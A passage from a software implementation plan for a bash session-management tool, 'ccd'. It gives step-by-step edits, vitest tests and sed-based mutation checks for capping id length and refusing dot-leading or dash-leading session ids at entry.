    _ws_project_valid "$project" \
      || die "invalid project '$project' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot or dash"
    id=$(_id "$wrapper" "$project")
  else
```

After:

```bash
    _ws_project_valid "$project" \
      || die "invalid project '$project' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot or dash"
    id=$(_id "$wrapper" "$project")
    _reg_id_cap "$id" || die "$_REG_ID_CAP_WHY — choose a shorter project; nothing was created"
  else
```

The cap is unconditional (R10). It runs before the pool checks, the compactions lock, the generation and every `_reg_set`.

**(4c) `cmd_enable`, the two-argument form.** It goes directly above the expiry refusal, which leaves it below Task 5's `_ws_project_valid "$2"` line.

Before:

```bash
  _ws_expire_refuse_return "$id" enable   # a return during an expiry refuses, before anything is journaled (EXPIRE region)
  _lc_done enable "$id" ""
```

After:

```bash
  if (( $# >= 2 )); then _reg_id_cap "$id" || die "$_REG_ID_CAP_WHY — choose a shorter project; nothing was created"; fi
  _ws_expire_refuse_return "$id" enable   # a return during an expiry refuses, before anything is journaled (EXPIRE region)
  _lc_done enable "$id" ""
```

- [ ] **Step 5: Restamp and run green**

```bash
bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd
cd server && ./node_modules/.bin/vitest run test/ccd-id-cap.test.ts test/ownership.test.ts test/mark-check.test.ts
```

Expected: PASS, with 8 of 8 in `ccd-id-cap.test.ts`, and `ownership` and `mark-check` green.

- [ ] **Step 6: The mutation rows (measured, then restored)**

Take one snapshot of the good tree first, from the workspace root:

```bash
S=$(mktemp -d) && cp ccd/ccd "$S/ccd.good" && cp server/test/ccd-id-cap.test.ts "$S/test.good"
```

For each row:
1. Apply the mutation.
2. Run `(cd server && ./node_modules/.bin/vitest run test/ccd-id-cap.test.ts)` and confirm the stated cases are red.
3. Restore with `cp "$S/ccd.good" ccd/ccd`, or `cp "$S/test.good" server/test/ccd-id-cap.test.ts` for M6.
4. Record the red titles in the ledger.

| # | Mutation (exact command) | Cases that go red |
|---|---|---|
| M1 | Delete the ws-add suffix: `sed -i 's/; _reg_id_cap "\$project-\$slug" \|\| die "\$_REG_ID_CAP_WHY — choose a shorter project or slug; nothing was created"$//' ccd/ccd` | `ws-add refuses one byte more, …` (a row and a worktree are created); `each mint site carries its own die line` |
| M2 | Delete start's line: `sed -i '/^    _reg_id_cap "\$id" \|\| die "\$_REG_ID_CAP_WHY — choose a shorter project; nothing was created"$/d' ccd/ccd` | `start creates _REG_ID_MAX, and refuses one more …`; `start refuses an over-cap id even when its row already exists`; `each mint site …` |
| M3 | Delete enable's line: `sed -i '/^  if (( \$# >= 2 )); then _reg_id_cap "\$id"/d' ccd/ccd` | `enable refuses one more before it journals` (an `enable` row is journaled before `cmd_start` refuses); `each mint site …` |
| M4 | Raise the cap by one: `sed -i 's/^_REG_ID_MAX=128$/_REG_ID_MAX=129/' ccd/ccd` | `the cap is the value …` (129 ≠ 128); `ws-add refuses one byte more, …`; `start creates … refuses one more …`; `start refuses an over-cap id …`; `enable refuses one more …` |
| M5 | `<=` to `<`: `sed -i 's/(( \${#id} <= _REG_ID_MAX ))/(( \${#id} < _REG_ID_MAX ))/' ccd/ccd` | `ws-add creates an id of exactly _REG_ID_MAX`; `start creates _REG_ID_MAX, …` (its accept half); `enable refuses one more …, and enables exactly _REG_ID_MAX` (its accept half) |
| M6 | Drop a template from the table: `sed -i "/template: 'slot.<id>.<ns>.<pid>'/d" server/test/ccd-id-cap.test.ts` | `every name template that embeds an id is in the census table` (`ccd/ccd:<n> slot.<id>.<ns>.<pid>` is uncovered) |
| M7 | Drop the byte count's locale, inside `_reg_id_cap` only (another function already holds the identical `local` line, so an unscoped `sed` changes two): `sed -i '/^_reg_id_cap() {/,/^}$/s/^  local LC_ALL=C id="\${1-}"$/  local id="${1-}"/' ccd/ccd` | `each mint site carries its own die line` (the `local LC_ALL=C` pin) |

In M1 and M2 the `|` inside the table is escaped for Markdown only. Type the commands with a bare `||`.

Each `sed` changes exactly one line. After applying it, and before running the suite, confirm it with `diff "$S/ccd.good" ccd/ccd | grep -c '^[<>]'`: 2 for M1, M4, M5 and M7 (a changed line shows as one `<` and one `>` line), and 1 for M2 and M3 (a deleted line shows as one `<`). For M6, the same count over `diff "$S/test.good" server/test/ccd-id-cap.test.ts` prints 1.

After the last row:

```bash
cmp ccd/ccd "$S/ccd.good" && cmp server/test/ccd-id-cap.test.ts "$S/test.good" && rm -rf "$S"
node shared/mark.mjs --check ccd/ccd; echo "stamp rc=$?"      # rc=0: the restored file is the stamped one
```

- [ ] **Step 7: Gates, unedited and green, in the foreground**

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-start-id.test.ts test/ccd-workspaces.test.ts test/ccd-ws-add-child.test.ts test/ccd-lifecycle-sites.test.ts test/ccd-refusal-scan.test.ts test/ccd-reg-id-ok.test.ts test/ccd-project-dash.test.ts test/ccd-ws-add-dash-id.test.ts test/ownership.test.ts test/mark-check.test.ts
cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts
```

`session-hook.test.ts` runs whole. That includes its `a peer id longer than CCRC_ID_MAX is excluded …` case, unedited, and the five citation passes (`CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier`), with no number edited. Re-run a CLAUDE.md load flake in isolation before calling it a break.

**Line neutrality.** `cmd_ws_add`, and every function above R15's insertion point (`# THE ID A VERB MAY BIND`), start on their `origin/main` lines. Functions between that point and `cmd_start()` move by exactly the lines R15's helpers add, and Task 13 (3b) measures them. From the workspace root:

```bash
diff <(git show origin/main:ccd/ccd | awk '/^# THE ID A WITNESS MAY BE NAMED FOR/{exit} /^[A-Za-z_][A-Za-z0-9_]*\(\) *\{/{print NR": "$1}') \
     <(awk '/^# THE ID A VERB MAY BIND/{exit} /^[A-Za-z_][A-Za-z0-9_]*\(\) *\{/{print NR": "$1}' ccd/ccd) && echo "starts unmoved"
```

Expected: `starts unmoved`. A difference means an edit above R15's insertion added or dropped a line; in this task that is the ws-add edit. Find that edit by content and fix it in place. Never delete an unrelated line to restore a start, and do not re-measure the census (R9).

- [ ] **Step 8: Ledger and commit**

Record in `.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md`:
- the cap (128) and W (81);
- the census rows, and any added in Step 2, with their files;
- `CENSUS_EXCLUDED` with its reason;
- each mutation row's red titles;
- the `starts unmoved` line;
- the R27 arm built;
- the departure slug `ws-add-lock-precedes-the-cap`: ws-add takes its per-project add lock before it chooses the slug, so a cap refusal leaves that lock file, as every ws-add refusal after the lock already does. The row, the worktree and the branch are never created.

Name these departures by slug in the wave-done: `id-cap-census-table-measured-at-the-export`, `census-compares-normalised-shapes`, `census-excludes-the-token-generation-file`, `history-spool-names-outside-the-census-patterns`, `reg-id-cap-under-lc-all-c-pinned`, `enable-cap-written-as-an-if`, and `ws-add-lock-precedes-the-cap`. On the last: ws-add's per-project `.ws-add-<project>.lock` already exists when the cap refuses, as it does for every ws-add refusal after the lock. So "nothing was created" holds for the row, the worktree and the branch, but not for that lock file.

```bash
git add ccd/ccd server/test/ccd-id-cap.test.ts
git commit -F - <<'EOF'
fix(ccd): cap a new id at every mint site, from the derived-name census

A new id is capped at _REG_ID_MAX bytes at the three sites that mint one:
ws-add (on its slug line, before the fetch and the worktree), start's
creating form (even when the row exists) and enable's two-argument form
(before it journals). Each writes its own die line from the one sentence
that _reg_id_cap sets in _REG_ID_CAP_WHY. The ws-add edit is line-neutral.

The number is derived, not chosen. ccd-id-cap.test.ts holds the census of
every name ccd, its hook and the server derive from an id. The widest is the
hook's session-claim temp, 81 bytes, which leaves 174. The cap is the lower of
that and the hook's own CCRC_ID_MAX gate, 128, so no minted id is skipped by
the hook's peer census (path-identity spec §2.6).
EOF
```

---

### Task 8: ws-reclaim, ws-expire and their audits refuse a dot-leading id at entry

**Model routing:** `opus`, effort `high`.

**Why:**
- **Spec §2.6 (SEC6).** ws-reclaim and ws-expire refuse a dot-leading id at entry, before any journal line, as ws-collect already does. A dot-leading id names ccd's own hidden registry files (`$REG/.<id>.*`). That makes it no child's, no archive's and no witness's.
- **What happens today at this point in the wave.** After Tasks 2 and 5, ws-reclaim's and ws-expire's entries call `_reg_id_ok`, which accepts `.hidden-x`.
  - ws-reclaim with a malformed token therefore journals `token-malformed` against `.hidden-x`.
  - ws-expire with a well-formed token creates a permanent `$REG/.reap-.x-y.lock`. Reap locks are never unlinked.
- **R16.** This task owns the dot rule. All three token verbs' entries become the one call `_ws_tmproot_id_ok "$id" || die "bad session id"`. That call refuses a dash as well as a dot, because of Task 5's re-derivation.
- **R3 and R22.** The rule also covers the two audits that mint these verbs' tokens:
  - `_ws_expire_audit_contained`'s entry becomes the same call;
  - `cmd_ws_audit`'s id line applies `_ws_tmproot_id_ok` in `--reclaim` mode only, edited in place and line-neutral. That function sits above the frozen citation anchors.
  - Plain `ws-audit` (reap mode) keeps today's check and today's answer.
- **R26.** No new `die` literal: `die "bad session id"` is reused at every site.

**Files:**
- Modify `ccd/ccd`. Five in-place edits, each replacing its lines one for one, so no line count changes. Edit B also rewrites the comment line Task 2 put directly above ws-expire's entry. Then restamp.
  - `cmd_ws_reclaim`: the entry line that Task 2 wrote (`_reg_id_ok "$id" … || die "bad session id"`). It sits directly above `[[ $token =~ ^[0-9a-f]{64}$ ]]         || _lc_refuse reclaim "$id" token-malformed "bad token"`.
  - `cmd_ws_expire`: the entry line that Task 2 wrote. It sits directly above `_json_str probe >/dev/null 2>&1 \` / `|| die "python3 unavailable — cannot quote the expiry record safely"`. This edit is made under workspace-lifecycle's consent.
  - `cmd_ws_collect`: Task 2's `_reg_id_ok "$id" && _ws_tmproot_id_ok "$id" || die "bad session id"`.
  - `_ws_expire_audit_contained`: the line `[[ $id =~ ^[A-Za-z0-9._-]+$ ]] || die "bad session id"` directly below `local id="$1" exists=false aliveflag=false workdir reaping sens="[" first=1 s`. This edit is made under workspace-lifecycle's consent.
  - `cmd_ws_audit`: the line `[[ $id =~ ^[A-Za-z0-9._-]+$ ]] || die "bad session id"` directly below `(( $# == 4 )) && defer=1` / `fi` / `local id=$2`. It is above the anchors and edited in place (R22).
- Create the test `server/test/ccd-token-verbs-dot-id.test.ts`.
  - Its name matches `/^ccd.*\.ts$/`, so it falls under `ccd-workspaces.test.ts`'s containment scan.
  - It makes no direct `execFileSync('bash'`, `spawnSync('bash'` or `spawn('bash'` call. Every ccd call goes through `makePrHarness`'s `run`.
- Not edited: `_ws_expire_locked` and every other line that #351 added, every other `ccd/ccd` function, and every existing test file.

**Interfaces:**
- Consumes, in `ccd/ccd`:
  - `_ws_tmproot_id_ok ID` (Task 5): `_ws_tmproot_id_ok() { _reg_id_ok "${1-}" && [[ "${1-}" != .* ]]; }`. rc 0 iff `_reg_id_ok ID` and ID is not dot-leading.
  - `_reg_id_ok WORD` (Task 1), through `_ws_tmproot_id_ok`.
- Consumes, in TypeScript (test-only, nothing from `server/src` or `shared` imported directly):
  - `ccdPrHelpers.ts`:
    - `makePrHarness(prefix: string): PrHarness`
    - `PrHarness.run(snippet: string): { code: number; stdout: string; stderr: string }`
    - `PrHarness.calls(): string[]`
    - `PrHarness.makeGhRepo(name: string, slug?: string): string`
    - `GH_STUB: string`
  - `childReclaimFixture.ts`: `CHILD_STUBS: string`, `CHILD_ENV: string`.
  - `wsExpireFixture.ts`: `EXP_STUBS: string`.
  - `wsCollectFixture.ts`: `WRONG_TOKEN: string` (64 zeros, well-formed).
  - `lifecycleHelpers.ts`: `readJournal(home: string): Record<string, unknown>[]`.
  - `dashIdFixture.ts` (Task 1): `reapLocks(home: string): string[]`.
- Produces: no new name. The five entries take their final form, as given in §Interfaces "Task 8, the final form":
  - ws-reclaim, ws-expire, ws-collect and `_ws_expire_audit_contained`: `_ws_tmproot_id_ok "$id" || die "bad session id"`.
  - `cmd_ws_audit`: `[[ $id =~ ^[A-Za-z0-9._-]+$ ]] && { [[ $mode != reclaim ]] || _ws_tmproot_id_ok "$id"; } || die "bad session id"`.
  - With this task, `ws-audit --reclaim` and `ws-audit --expire` refuse a dash-leading id. Task 10's `POSITIONAL_PROBES` rows for `wsReclaimAudit` and `wsExpireAudit` expect `'refused'` because of this.

- [ ] **Step 1: Entry measurements (Tasks 1 to 7 are committed; measure, never assume)**

Run these from the workspace root:

```bash
grep -cF '_ws_tmproot_id_ok() { _reg_id_ok "${1-}" && [[ "${1-}" != .* ]]; }' ccd/ccd          # (a) 1: Task 5's re-derivation
grep -c '^_reg_id_ok() { local LC_ALL=C;' ccd/ccd                                               # (b) 1: Task 1's helper
awk '/^cmd_ws_reclaim\(\) \{/{f=1} f&&/die "bad session id"/{print NR": "$0; exit}' ccd/ccd    # (c) Task 2's reclaim entry
awk '/^cmd_ws_expire\(\) \{/{f=1} f&&/die "bad session id"/{print NR": "$0; exit}' ccd/ccd     # (d) Task 2's expire entry
awk '/^cmd_ws_collect\(\) \{/{f=1} f&&/die "bad session id"/{print NR": "$0; exit}' ccd/ccd    # (e) Task 2's collect entry
awk '/^_ws_expire_audit_contained\(\) \{/{f=1} f&&/die "bad session id"/{print NR": "$0; exit}' ccd/ccd   # (f) the inline regex
awk '/^cmd_ws_audit\(\) \{/{f=1} f&&/die "bad session id"/{print NR": "$0; exit}' ccd/ccd      # (g) the inline regex, directly below `local id=$2`
grep -cE '\[\[ \$id =~ \^\[A-Za-z0-9\._-\]\+\$ \]\]' ccd/ccd                                   # (h) 6: attic, pr-open, ws-audit, ws-reap, forget, and the expire audit
grep -cE '^  _ws_tmproot_id_ok "\$id" \|\| die "bad session id"$' ccd/ccd                       # (i) 1: `_ws_collect_audit_contained`'s entry, the precedent
grep -c 'export function reapLocks' server/test/dashIdFixture.ts                                # (j) 1
grep -n 'consent' .superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md    # (k) Task 0's record of workspace-lifecycle's consent to the three ws-expire edits
```

What each check should print:
- (c) prints `_reg_id_ok "$id"                       || die "bad session id"`: Task 2's padded spelling, its `||` aligned with the `[[ $token =~ … ]]` line below it.
- (d) prints the same text.
- (e) prints `_reg_id_ok "$id" && _ws_tmproot_id_ok "$id"               || die "bad session id"`: Task 2's padded spelling.
- Step 4's edits A, B and C replace each line exactly as (c), (d) and (e) print it, and their before blocks carry Task 2's padding. If the measured padding differs, the printed line is the before text. Every after line is unpadded, because Step 4's count `^  _ws_tmproot_id_ok "\$id" \|\| die "bad session id"$` reads that exact spelling.

**STOP** in either of these cases:
- (a), (b) or (j) prints nothing;
- (k) prints nothing, and the dispatch brief does not carry workspace-lifecycle's consent to the three ws-expire edits either (Task 0 Step 6 requires the brief to carry it; when only the brief has it, copy that line into the ledger and go on);
- (c), (d) or (e) prints a different call.

In both cases, report the measured lines. A line number that differs from a hint is not a STOP.

- [ ] **Step 2: Write the failing test** `server/test/ccd-token-verbs-dot-id.test.ts`

```ts
// path-identity W1b, Task 8 (path-identity spec §2.6, decision SEC6). The three token verbs (ws-reclaim, ws-expire
// and ws-collect) and the two audits that mint their tokens (`ws-audit --reclaim` and `ws-audit --expire`) apply ONE
// id rule at entry, `_ws_tmproot_id_ok`: the registry charset, never dash-leading, and never dot-leading. A
// dot-leading id names ccd's own hidden registry files (`$REG/.<id>.*`), so it is no child's, no archive's and no
// witness's. Without this rule, ws-reclaim journaled a token refusal against such an id, and ws-expire created a
// permanent `.reap-.<id>.lock` for it. Each refusal is the bare `die "bad session id"`: nothing is read, nothing is
// journaled, and no lock is taken. Plain `ws-audit` (reap mode) is no token verb's audit; it keeps today's answer for
// the same id.
//
// FIXTURE HOME ONLY. Every call is a sourced function under `makePrHarness`'s HOME. The reclaim and expiry
// machinery's recorders (`CHILD_STUBS`, `EXP_STUBS`) stand in for the unit and the pane, and the residue probe stays
// inside that HOME (`CHILD_ENV`). `_alive` is redefined as a RECORDER: it is the first read each audit makes after
// its id check, so an empty `ccd-calls` proves the entry refused before anything was read.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { GH_STUB, makePrHarness, type PrHarness } from './ccdPrHelpers.js';
import { readJournal } from './lifecycleHelpers.js';
import { CHILD_ENV, CHILD_STUBS } from './childReclaimFixture.js';
import { EXP_STUBS } from './wsExpireFixture.js';
import { WRONG_TOKEN } from './wsCollectFixture.js';
import { reapLocks } from './dashIdFixture.js';

let h: PrHarness;
beforeEach(() => { h = makePrHarness('ccrc-token-dot-id-'); });
afterEach(() => { h.cleanup(); });

type Run = { code: number; stdout: string; stderr: string };

/** A well-formed token. The entry rule must refuse before any token is compared. */
const TOK = 'a'.repeat(64);
/** `_alive` as a recorder: the first read each audit makes after its id check (see the header). */
const ALIVE_REC = '_alive() { echo "alive $*" >> "$HOME/ccd-calls"; return 1; };';
/** The stubs `ccd-ws-audit.test.ts` uses for a plain audit: no tmux, and every session gone. */
const PLAIN_STUBS = 'tmux() { return 1; }; _session_verdict() { echo gone; };';

const reclaimAt = (id: string, token: string): Run =>
  h.run(`${CHILD_STUBS} ${ALIVE_REC} ${CHILD_ENV} cmd_ws_reclaim --expect ${token} --child-of 7 --session '${id}'`);
const expireAt = (id: string): Run =>
  h.run(`${EXP_STUBS} ${ALIVE_REC} ${CHILD_ENV} cmd_ws_expire --expect ${TOK} --session '${id}'`);
const collectAt = (id: string): Run =>
  h.run(`${ALIVE_REC} cmd_ws_collect --expect ${WRONG_TOKEN} --session '${id}'`);
const reclaimAuditAt = (id: string, defer = false): Run =>
  h.run(`${CHILD_STUBS} ${ALIVE_REC} ${CHILD_ENV} cmd_ws_audit --session '${id}' --reclaim${defer ? ' --defer-expired' : ''}`);
const expireAuditAt = (id: string): Run =>
  h.run(`${EXP_STUBS} ${ALIVE_REC} ${CHILD_ENV} cmd_ws_audit --session '${id}' --expire`);
const plainAuditAt = (id: string): Run =>
  h.run(`${GH_STUB} ${PLAIN_STUBS} cmd_ws_audit --session '${id}'`);

/** The entry refused, and nothing came after it: no document, no read, no lock and no journal line. */
const expectEntryDeath = (r: Run, what: string): void => {
  expect(r.code, `${what}: ${r.stdout}${r.stderr}`).toBe(1);
  expect(r.stderr, what).toContain('bad session id');
  expect(r.stdout, `${what}: a die prints no document`).toBe('');
  expect(h.calls(), `${what}: nothing was read after the entry`).toEqual([]);
  expect(reapLocks(h.home), `${what}: no reap lock was created`).toEqual([]);
  expect(readJournal(h.home), `${what}: nothing was journaled`).toEqual([]);
};

describe('the token verbs and their audits refuse a dot-leading id at entry, as ws-collect does (path-identity spec §2.6)', () => {
  it('ws-reclaim --session .hidden-x dies "bad session id", journals nothing, and takes no lock', () => {
    // A malformed token: without the rule, the token check is reached and journals `token-malformed` against the id.
    expectEntryDeath(reclaimAt('.hidden-x', 'x'), 'ws-reclaim, malformed token');
    // A well-formed token: without the rule, the verb reaches the reap lock and creates `.reap-.hidden-x.lock`.
    expectEntryDeath(reclaimAt('.hidden-x', TOK), 'ws-reclaim, well-formed token');
  }, 60_000);

  it('ws-expire --session .x-y with a well-formed token dies "bad session id", and there is no .reap-.x-y.lock', () => {
    expectEntryDeath(expireAt('.x-y'), 'ws-expire');
    expect(fs.existsSync(path.join(h.home, '.cc-sessions', '.reap-.x-y.lock')), 'the permanent lock').toBe(false);
  }, 60_000);

  it('ws-audit --reclaim and ws-audit --expire die "bad session id" for .x-y before anything is read', () => {
    expectEntryDeath(reclaimAuditAt('.x-y'), 'ws-audit --reclaim');
    expectEntryDeath(reclaimAuditAt('.x-y', true), 'ws-audit --reclaim --defer-expired');
    expectEntryDeath(expireAuditAt('.x-y'), 'ws-audit --expire');
  }, 60_000);

  it('plain ws-audit for .x-y keeps today\'s answer', () => {
    // Reap mode is no token verb's audit (path-identity spec §2.6 names the token verbs alone). It audits the literal id,
    // which has no row: Phase A's first rung, as `ccd-ws-audit.test.ts` measures for an id it never heard of.
    h.makeGhRepo('demo');
    const r = plainAuditAt('.x-y');
    expect(r.code, r.stdout + r.stderr).toBe(0);
    const doc = JSON.parse(r.stdout) as Record<string, unknown>;
    expect(doc['verdict'], 'the literal id, refused by the ladder, never at entry').toBe('no-such-session');
    expect(doc['token'], 'a refusal hands out no token').toBeUndefined();
    expect(reapLocks(h.home)).toEqual([]);
  }, 60_000);

  it('ws-collect --session .x-y still dies "bad session id" through the one call', () => {
    expectEntryDeath(collectAt('.x-y'), 'ws-collect');
  }, 60_000);

  it('a dash-leading id still dies at all five entries', () => {
    // The three verbs refused a dash-leading id already (the dash rule at their entries). The two audits refuse it from
    // this task on, because `_ws_tmproot_id_ok` derives from `_reg_id_ok`. One delegation now carries both rules at all five.
    for (const id of ['-x-y', '--actor']) {
      expectEntryDeath(reclaimAt(id, TOK), `ws-reclaim ${id}`);
      expectEntryDeath(expireAt(id), `ws-expire ${id}`);
      expectEntryDeath(collectAt(id), `ws-collect ${id}`);
      expectEntryDeath(reclaimAuditAt(id), `ws-audit --reclaim ${id}`);
      expectEntryDeath(expireAuditAt(id), `ws-audit --expire ${id}`);
    }
  }, 120_000);
});
```

- [ ] **Step 3: Run it and see it fail**

From `server/`, in the foreground, with a timeout of at least 600000 ms:

```bash
./node_modules/.bin/vitest run test/ccd-token-verbs-dot-id.test.ts
```

Expected: **4 failed, 2 passed.**
- `ws-reclaim --session .hidden-x …` FAILS:
  - with the malformed token, stderr says `bad token`, not `bad session id`;
  - with the well-formed token, a refusal document comes back at exit 0, and `.reap-.hidden-x.lock` exists.
- `ws-expire --session .x-y …` FAILS: exit 0 with a refusal document, and `.reap-.x-y.lock` is created.
- `ws-audit --reclaim and ws-audit --expire …` FAILS: a document comes back on stdout, and `ccd-calls` holds `alive .x-y`.
- `a dash-leading id still dies at all five entries` FAILS at `ws-audit --reclaim -x-y`. The three verbs' rows pass first, through the dash rule at their entries.
- `plain ws-audit for .x-y keeps today's answer` PASSES. It guards against over-tightening, green before and after.
- `ws-collect --session .x-y still dies …` PASSES. It pins the delegation and the precedent.

Any other red set is reported by slug before going on.

- [ ] **Step 4: Implement: five in-place edits in `ccd/ccd`**

**Edit A: `cmd_ws_reclaim`'s entry.** The before line is Task 2's padded spelling, as Step 1 (c) printed it.

Before:
```bash
  _reg_id_ok "$id"                       || die "bad session id"
  [[ $token =~ ^[0-9a-f]{64}$ ]]         || _lc_refuse reclaim "$id" token-malformed "bad token"
```
After:
```bash
  _ws_tmproot_id_ok "$id" || die "bad session id"
  [[ $token =~ ^[0-9a-f]{64}$ ]]         || _lc_refuse reclaim "$id" token-malformed "bad token"
```

**Edit B: `cmd_ws_expire`'s entry, and the comment line Task 2 put directly above it.** The before entry line is Task 2's padded spelling, as Step 1 (d) printed it. The comment is rewritten in place, one line for one, so that it names the dot rule (SEC6) the line below it now also enforces; the two lines are adjacent, so they make one hunk.

Before:
```bash
  # NO FLAG SPELLING BINDS: `_reg_id_ok` refuses a leading `-` (path-identity spec §2.4), before the reap lock.
  _reg_id_ok "$id"                       || die "bad session id"
  _json_str probe >/dev/null 2>&1 \
    || die "python3 unavailable — cannot quote the expiry record safely"
```
After:
```bash
  # NO FLAG SPELLING AND NO DOT-LEADING NAME BINDS: `_ws_tmproot_id_ok` refuses both (path-identity spec §2.4, §2.6), before the reap lock.
  _ws_tmproot_id_ok "$id" || die "bad session id"
  _json_str probe >/dev/null 2>&1 \
    || die "python3 unavailable — cannot quote the expiry record safely"
```

**Edit C: `cmd_ws_collect`'s entry.** `_ws_tmproot_id_ok` now carries `_reg_id_ok`, so the pair becomes the one call.

Before (Task 2's padded spelling, as Step 1 (e) printed it):
```bash
  _reg_id_ok "$id" && _ws_tmproot_id_ok "$id"               || die "bad session id"
```
After:
```bash
  _ws_tmproot_id_ok "$id" || die "bad session id"
```

**Edit D: `_ws_expire_audit_contained`'s entry** (under workspace-lifecycle's consent).

Before:
```bash
  local id="$1" exists=false aliveflag=false workdir reaping sens="[" first=1 s
  [[ $id =~ ^[A-Za-z0-9._-]+$ ]] || die "bad session id"
```
After:
```bash
  local id="$1" exists=false aliveflag=false workdir reaping sens="[" first=1 s
  _ws_tmproot_id_ok "$id" || die "bad session id"
```

**Edit E: `cmd_ws_audit`'s id line** (above the anchors, in place, line-neutral). The `--expire` and `--collect` modes hand off before this line, so `mode` is `reap` or `reclaim` here.

Before:
```bash
    (( $# == 4 )) && defer=1
  fi
  local id=$2
  [[ $id =~ ^[A-Za-z0-9._-]+$ ]] || die "bad session id"
```
After:
```bash
    (( $# == 4 )) && defer=1
  fi
  local id=$2
  [[ $id =~ ^[A-Za-z0-9._-]+$ ]] && { [[ $mode != reclaim ]] || _ws_tmproot_id_ok "$id"; } || die "bad session id"
```

One comment line changes, in place: Edit B's. Its one backticked name, `_ws_tmproot_id_ok`, exists, so the danglers scan is unaffected, and it holds no `die "` text. No comment is added. No `die` literal is new, so `SANCTIONED` stays 16.

Then, from the workspace root:

```bash
bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd; echo "stamp rc=$?"   # rc=0
git diff -U0 -- ccd/ccd | grep -c '^@@'                                                     # 6: the stamp line and the five edits, nothing else
grep -cE '\[\[ \$id =~ \^\[A-Za-z0-9\._-\]\+\$ \]\]' ccd/ccd                                # 5: ws-attic, pr-open, ws-audit, ws-reap, forget (Task 13's count)
grep -cE '^  _ws_tmproot_id_ok "\$id" \|\| die "bad session id"$' ccd/ccd                   # 5: the collect audit, plus reclaim, expire, collect and the expire audit
grep -c '_reg_id_ok "\$id" && _ws_tmproot_id_ok' ccd/ccd                                    # 0
```

- [ ] **Step 5: Run it green**

From `server/`, in the foreground, with a timeout of at least 600000 ms:

```bash
./node_modules/.bin/vitest run test/ccd-token-verbs-dot-id.test.ts
```

Expected: **6 passed.**

- [ ] **Step 6: The mutation rows (each measured, then restored from a saved copy)**

Save the implemented, restamped tree first, from the workspace root:

```bash
S=$(mktemp -d) && cp ccd/ccd "$S/ccd.task8" && echo "$S"
```

For each row:
1. Apply the edit to `ccd/ccd`.
2. Run the command from `server/` in the foreground (timeout of at least 600000 ms).
3. See the stated red.
4. Restore with `cp "$S/ccd.task8" ccd/ccd`, from the workspace root.

Never use `git checkout -- ccd/ccd`: it would discard this task's uncommitted edits.

In the table, `\|` is a Markdown table escape, in the mutation text and in the `-t` filters alike: type a plain `|`. Typed as `\|`, a `-t` filter matches no title, every case is skipped, and the row reads green.

| # | Mutation (before → after, in `ccd/ccd`) | Command (from `server/`) | Expected red |
|---|---|---|---|
| M1 | Edit A reverted: `  _ws_tmproot_id_ok "$id" \|\| die "bad session id"` directly above `[[ $token =~ ^[0-9a-f]{64}$ ]]         \|\| _lc_refuse reclaim` → `  _reg_id_ok "$id" \|\| die "bad session id"` | `./node_modules/.bin/vitest run test/ccd-token-verbs-dot-id.test.ts -t 'ws-reclaim --session'` | stderr says `bad token`, and a `token-malformed` row is journaled against `.hidden-x`. With the well-formed token, `.reap-.hidden-x.lock` exists |
| M2 | Edit B reverted: the line above `… cannot quote the expiry record safely` → `  _reg_id_ok "$id" \|\| die "bad session id"` | `./node_modules/.bin/vitest run test/ccd-token-verbs-dot-id.test.ts -t 'ws-expire --session'` | exit 0 with a refusal document, and `.reap-.x-y.lock` exists |
| M3 | Edit C weakened: the line above `… cannot quote the collection record safely` → `  _reg_id_ok "$id" \|\| die "bad session id"` | `./node_modules/.bin/vitest run test/ccd-token-verbs-dot-id.test.ts test/ccd-ws-collect-verb.test.ts -t 'ws-collect --session\|argv: four positionals'` | not `bad session id`: a `not-witnessed` refusal at exit 0, or an unmeasured document at exit 1. `ccd-ws-collect-verb`'s `.hidden` row goes red too |
| M4 | Edit D reverted: the line below `local id="$1" exists=false aliveflag=false workdir reaping …` → `  _reg_id_ok "$id" \|\| die "bad session id"` | `./node_modules/.bin/vitest run test/ccd-token-verbs-dot-id.test.ts -t 'ws-audit --reclaim and'` | at `ws-audit --expire`: a document on stdout, and `alive .x-y` in `ccd-calls` |
| M5 | Edit E reverted: `cmd_ws_audit`'s id line → `  [[ $id =~ ^[A-Za-z0-9._-]+$ ]] \|\| die "bad session id"` | `./node_modules/.bin/vitest run test/ccd-token-verbs-dot-id.test.ts -t 'ws-audit --reclaim and\|dash-leading id still dies'` | at `ws-audit --reclaim` for `.x-y` and for `-x-y`: a document on stdout, and `alive …` recorded |
| M6 | Edit E over-tightened: `cmd_ws_audit`'s id line → `  [[ $id =~ ^[A-Za-z0-9._-]+$ ]] && _ws_tmproot_id_ok "$id" \|\| die "bad session id"` (the rule in every mode) | `./node_modules/.bin/vitest run test/ccd-token-verbs-dot-id.test.ts -t 'plain ws-audit'` | exit 1 with `bad session id`, where today's `no-such-session` document was |
| M7 | The delegation broken: in `_ws_tmproot_id_ok`'s line, `_reg_id_ok "${1-}" && [[ "${1-}" != .* ]]` → `local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != .* ]]` (the pre-Task-5 body) | `./node_modules/.bin/vitest run test/ccd-token-verbs-dot-id.test.ts -t 'dash-leading id still dies'` | at `ws-reclaim -x-y`: no `bad session id`, and `.reap--x-y.lock` exists |

In the table, each `\|` is a Markdown escape. Type a plain `|`, in each `||` and in each `-t` pattern, where `\|` would match no title and the row would read green.

Afterwards, from the workspace root:

```bash
cmp ccd/ccd "$S/ccd.task8" && node shared/mark.mjs --check ccd/ccd && rm -r "$S"; echo "restored rc=$?"   # rc=0
```

Record each row's measured red in the SDD ledger. A row that stays green is a finding: report it by slug, and do not commit until the coordinator rules.

- [ ] **Step 7: The task's gates (run whole, unedited, green)**

From `server/`, in the foreground, with a timeout of at least 600000 ms per call:

```bash
./node_modules/.bin/vitest run test/ccd-token-verbs-dot-id.test.ts test/ccd-token-verbs-dash-id.test.ts test/ccd-project-dash.test.ts
